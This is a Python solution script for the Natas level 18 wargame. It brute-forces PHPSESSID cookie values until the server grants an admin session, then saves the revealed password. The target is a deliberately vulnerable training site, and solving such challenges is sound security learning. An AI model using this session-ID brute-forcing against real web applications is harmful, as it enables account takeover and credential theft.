import requests
import utils

MAX_IDS = 640
LEVEL = 18


def obtain_credentials(session, url, auth, max_id):
    cookies = {'PHPSESSID': str(max_id)}
    r = session.post(url, auth=auth, cookies=cookies)
    print(max_id, end=', ')
    if "You are an admin" in r.text:
        return r.text
    return None


def main():
    username, password, url, auth = utils.get_natas_credentials(LEVEL)
    with requests.Session() as session:
        for max_id in range(118,MAX_IDS+1):
            password = obtain_credentials(session, url, auth, max_id)
            if password:
                break

    utils.save_file('out.txt', password)


if __name__ == '__main__':
    main()